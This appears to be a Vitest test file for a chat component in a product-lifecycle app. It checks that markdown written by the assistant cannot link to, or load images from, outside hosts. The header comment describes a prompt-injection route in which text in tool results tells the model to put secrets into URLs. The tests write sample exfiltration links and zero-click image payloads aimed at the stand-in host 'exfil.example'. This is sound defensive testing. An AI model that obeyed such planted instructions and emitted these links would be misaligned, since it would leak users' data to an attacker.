// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (c) 2026 Cascadia PLM LLC

/**
 * Chat markdown link egress.
 *
 * Security gate. Assistant text is markdown-rendered, and the model writes it
 * after reading tool results — item names, descriptions and comments that any
 * user with write access authored. A URL in that text is therefore not
 * necessarily one the model chose freely, and the renderer used to emit every
 * off-origin href as a live `target="_blank"` anchor: one click and the
 * destination host receives whatever the model was told to append to it.
 * `![](…)` is worse still, because an image needs no click.
 *
 * The invariant these pin: nothing the renderer produces addresses a host
 * other than this app, and an in-app link still routes in-app rather than
 * leaving the SPA.
 *
 * Run: npx vitest run packages/core/src/components/ai/ChatMessage.links.test.tsx
 */

import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { ChatMessage } from './ChatMessage'

const EVIL = 'exfil.example'

function renderAssistant(content: string) {
  const onNavigate = vi.fn()
  render(
    <ChatMessage
      role="assistant"
      parts={[{ type: 'text', content }]}
      onNavigate={onNavigate}
    />,
  )
  return { onNavigate }
}

/** Every non-empty URL-bearing attribute the render produced. */
function renderedUrls(): Array<string> {
  return Array.from(document.querySelectorAll('[href], [src]')).flatMap((el) =>
    ['href', 'src'].flatMap((attr) => {
      const value = el.getAttribute(attr)
      return value ? [value] : []
    }),
  )
}

describe('ChatMessage markdown links', () => {
  it('renders an external link as text with no destination', () => {
    renderAssistant(`See [the report](https://${EVIL}/collect?d=secret).`)

    expect(screen.getByText('the report')).toBeInTheDocument()
    expect(document.querySelector('a')).toBeNull()
    expect(document.body.innerHTML).not.toContain(EVIL)
  })

  it('gives an inline image no source off this origin', () => {
    // The zero-click case: an <img> fetches on render, so a rendered external
    // src leaks without the user doing anything at all.
    renderAssistant(`![chart](https://${EVIL}/pixel.png?d=secret)`)

    expect(document.querySelector('img')).toBeNull()
    expect(renderedUrls()).toEqual([])
    expect(document.body.innerHTML).not.toContain(EVIL)
    // The alt text stands in, so the message still reads.
    expect(screen.getByText('chart')).toBeInTheDocument()
  })

  it('still renders an image this app serves', () => {
    // The gate is a filter, not a ban: a vault path is same-origin.
    renderAssistant('![drawing](/api/v1/files/abc/download)')

    expect(screen.getByAltText('drawing')).toHaveAttribute(
      'src',
      '/api/v1/files/abc/download',
    )
  })

  it('strips a linkified bare URL as well', () => {
    // remark-gfm autolinks literals, so a URL sitting in prose becomes an
    // anchor without the model ever writing link syntax.
    renderAssistant(`Details at https://${EVIL}/collect now.`)

    expect(document.querySelector('a')).toBeNull()
    expect(renderedUrls()).toEqual([])
    // The text survives; only its destination is gone.
    expect(screen.getByText(`https://${EVIL}/collect`)).toBeInTheDocument()
  })

  it('keeps an in-app link, and routes it in-app', () => {
    const { onNavigate } = renderAssistant('Open [P-1001](/parts/abc?tab=bom).')

    const link = screen.getByRole('link', { name: 'P-1001' })
    expect(link).toHaveAttribute('href', '/parts/abc?tab=bom')
    // A new browsing context is what an off-site link needed; an in-app one
    // must not have one.
    expect(link).not.toHaveAttribute('target')

    fireEvent.click(link)
    expect(onNavigate).toHaveBeenCalledWith('/parts/abc?tab=bom')
  })

  it('leaves user messages unrendered as markdown', () => {
    // User text is shown verbatim, so nothing here should be linkified either.
    render(
      <ChatMessage
        role="user"
        parts={[{ type: 'text', content: `https://${EVIL}/collect` }]}
      />,
    )

    expect(document.querySelector('a')).toBeNull()
  })
})
